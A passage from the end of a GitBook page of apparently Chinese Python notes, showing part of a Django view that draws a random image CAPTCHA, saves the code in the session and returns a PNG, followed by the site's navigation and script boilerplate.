        random_upper = chr(random.randint(65,90))
        random_lower = chr(random.randint(97,122))
        random_int = str(random.randint(0,9))
        # &#x4ECE;&#x4E0A;&#x9762;&#x4E09;&#x4E2A;&#x91CC;&#x9762;&#x968F;&#x673A;&#x9009;&#x62E9;&#x4E00;&#x4E2A;
        tmp = random.choice([random_lower,random_upper,random_int])
        # &#x5C06;&#x4EA7;&#x751F;&#x7684;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;&#x5199;&#x5165;&#x5230;&#x56FE;&#x7247;&#x4E0A;
        &quot;&quot;&quot;
        &#x4E3A;&#x4EC0;&#x4E48;&#x4E00;&#x4E2A;&#x4E2A;&#x5199;&#x800C;&#x4E0D;&#x662F;&#x751F;&#x6210;&#x597D;&#x4E86;&#x4E4B;&#x540E;&#x518D;&#x5199;
        &#x56E0;&#x4E3A;&#x4E00;&#x4E2A;&#x4E2A;&#x5199;&#x80FD;&#x591F;&#x63A7;&#x5236;&#x6BCF;&#x4E2A;&#x5B57;&#x4F53;&#x7684;&#x95F4;&#x9699; &#x800C;&#x751F;&#x6210;&#x597D;&#x4E4B;&#x540E;&#x518D;&#x5199;&#x7684;&#x8BDD;
        &#x95F4;&#x9699;&#x5C31;&#x6CA1;&#x6CD5;&#x63A7;&#x5236;&#x4E86;
        &quot;&quot;&quot;
        img_draw.text((i*60+60,-2),tmp,get_random(),img_font)
        # &#x62FC;&#x63A5;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;
        code += tmp
    print(code)
    # &#x968F;&#x673A;&#x9A8C;&#x8BC1;&#x7801;&#x5728;&#x767B;&#x9646;&#x7684;&#x89C6;&#x56FE;&#x51FD;&#x6570;&#x91CC;&#x9762;&#x9700;&#x8981;&#x7528;&#x5230; &#x8981;&#x6BD4;&#x5BF9; &#x6240;&#x4EE5;&#x8981;&#x627E;&#x5730;&#x65B9;&#x5B58;&#x8D77;&#x6765;&#x5E76;&#x4E14;&#x5176;&#x4ED6;&#x89C6;&#x56FE;&#x51FD;&#x6570;&#x4E5F;&#x80FD;&#x62FF;&#x5230;
    request.session[&apos;code&apos;] = code
    io_obj = BytesIO()
    img_obj.save(io_obj,&apos;png&apos;)
    return HttpResponse(io_obj.getvalue())
</code></pre>
                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="../tips.html" class="navigation navigation-prev " aria-label="Previous page: tips">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="../interview/python.html" class="navigation navigation-next " aria-label="Next page: python后端开发面试题">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"python","level":"2.1","depth":1,"next":{"title":"python后端开发面试题","level":"2.1.1","depth":2,"path":"interview/python.md","ref":"interview/python.md","articles":[]},"previous":{"title":"tips","level":"1.2","depth":1,"path":"tips.md","ref":"tips.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-lunr"],"pluginsConfig":{"highlight":{},"search":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"language/python.md","mtime":"2023-05-29T04:48:30.221Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-09-19T07:29:17.418Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

